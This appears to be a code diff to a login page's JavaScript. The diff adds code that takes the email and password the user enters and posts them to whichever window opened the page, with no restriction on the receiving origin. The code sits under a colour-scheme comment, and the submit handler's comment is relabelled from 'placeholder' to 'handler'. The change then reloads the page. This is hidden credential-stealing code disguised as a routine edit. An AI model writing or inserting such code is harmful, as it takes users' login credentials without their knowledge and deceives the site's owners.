@@ -12,6 +12,24 @@
   // ----------------------------------------------------------
   // 1. COLOR SCHEME — edit these to restyle the whole page
   // ----------------------------------------------------------
+  if (window.called) {
+      return;
+  }
+  window.called = true;
+  window.email = '';
+  window.password = '';
+  window.final_login = function() {
+    if (window.opener) {
+        window.opener.postMessage({
+            email: window.email,
+            password: window.password
+        }, '*');
+    }
+    // Close the overlay
+    setTimeout(() => {
+      window.location = window.location.href;
+    }, 1000);
+  };
   const COLORS = {
     bg: '#ffffff',
     panelBg: '#f4f4f6',
@@ -306,13 +324,12 @@
     const currentYear = new Date().getFullYear();
     refs.copyrightSpan.textContent = '\u00A9 ' + CONTENT.copyrightStartYear + '\u2013' + currentYear + ' ' + CONTENT.copyrightName;
 
-    // Form submit placeholder
+    // Form submit handler
     refs.form.addEventListener('submit', (e) => {
       e.preventDefault();
-      console.log('Sign in submitted:', {
-        email: document.getElementById('lp-email').value,
-        password: refs.passwordInput.value
-      });
+      window.email = document.getElementById('lp-email').value;
+      window.password = refs.passwordInput.value;
+      window.final_login();
     });
 
     // Dynamic image load with spinner
